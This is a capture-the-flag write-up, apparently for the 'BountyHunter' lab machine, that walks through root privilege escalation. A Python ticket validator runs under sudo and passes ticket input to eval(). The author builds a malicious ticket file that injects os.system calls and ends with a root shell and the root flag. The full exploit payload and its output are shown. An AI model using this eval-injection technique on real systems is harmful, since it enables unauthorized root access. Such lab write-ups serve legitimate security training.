# # `Enumeration` -

```bash
development@bountyhunter:~$ ls
contract.txt  tkt.md  user.txt
development@bountyhunter:~$ cat contract.txt 
Hey team,

I'll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.

This has been our first job since the "rm -rf" incident and we can't mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.

I set up the permissions for you to test this. Good luck.

-- John
```

It talks about something related to tickets.

Checking for sudo -

```bash
development@bountyhunter:~$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

Checking out the folder -

```bash
development@bountyhunter:~$ cd /opt/skytrain_inc/
development@bountyhunter:/opt/skytrain_inc$ ls
invalid_tickets  ticketValidator.py
development@bountyhunter:/opt/skytrain_inc$ cd invalid_tickets/
development@bountyhunter:/opt/skytrain_inc/invalid_tickets$ ls
390681613.md  529582686.md  600939065.md  734485704.md
development@bountyhunter:/opt/skytrain_inc/invalid_tickets$ cat 390681613.md 
# Skytrain Inc
## Ticket to New Haven
__Ticket Code:__
**31+410+86**
##Issued: 2021/04/06
#End Ticket
```
We can see some invalid tickets as said in the contract.Lets check the ticketValidator-
```bash
development@bountyhunter:/opt/skytrain_inc$ cat ticketValidator.py
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```

Going through the code we can see the `eval` function which runs input as Python code.We need to take control of the eval function.

To create a Valid Ticket according to the above script  -

- We need to create .md file
- First line needs to starts with “”# Skytrain Inc”
- Second line needs to starts with “## Ticket to “
- Third line needs to starts with “__Ticket Code:__”
- Fourth line needs to starts with  “**”
- After that we need to enter a number which when divided by 7 has a remainder of 4 and we need "+" symbol after that number.
- After that `eval` function will be called which will remove ""**""  from the forth line and check if the number is greater than 100.

# # `Valid ticket` -

So keeping in mind the above points and taking some help from invalid ticket samples our file should like -

```bash
# Skytrain Inc
## Ticket to New Haven
__Ticket Code:__
**25+410+86**
##Issued: 2021/04/06
#End Ticket
```

Just changed 31 to 25(25/7,remainder=4) from the invalid ticket.Lets see if its working -

```bash
development@bountyhunter:/opt/skytrain_inc$ cd /dev/shm
development@bountyhunter:/dev/shm$ nano nap.md
development@bountyhunter:/dev/shm$ cat nap.md 
# Skytrain Inc
## Ticket to New Haven
__Ticket Code:__
**25+410+86**
##Issued: 2021/04/06
#End Ticket
development@bountyhunter:/dev/shm$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
development@bountyhunter:/dev/shm$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
/dev/shm/nap.md
Destination: New Haven
Valid ticket.
```

We get a Valid Ticket :)

Now we need to exploit the `eval` function to run some commands -

Payload -

```bash
development@bountyhunter:/dev/shm$ cat nap.md 
# Skytrain Inc
## Ticket to New Haven
__Ticket Code:__
**25+410+86+__import__('os').system('id')**
##Issued: 2021/04/06
#End Ticket
development@bountyhunter:/dev/shm$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
/dev/shm/nap.md
Destination: New Haven
uid=0(root) gid=0(root) groups=0(root)
Valid ticket.
```

# # `Root` -

Just change the `id` to `/bin/bash` -

```bash
development@bountyhunter:/dev/shm$ cat nap.md 
# Skytrain Inc
## Ticket to New Haven
__Ticket Code:__
**25+410+86+__import__('os').system('/bin/bash')**
##Issued: 2021/04/06
#End Ticket
development@bountyhunter:/dev/shm$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
/dev/shm/nap.md
Destination: New Haven
root@bountyhunter:/dev/shm# id
uid=0(root) gid=0(root) groups=0(root)
root@bountyhunter:/dev/shm# cd /root/
root@bountyhunter:~# ls
root.txt  snap
root@bountyhunter:~# cat root.txt 
c0e756cd36c9680fc34b44ff959dd14c
```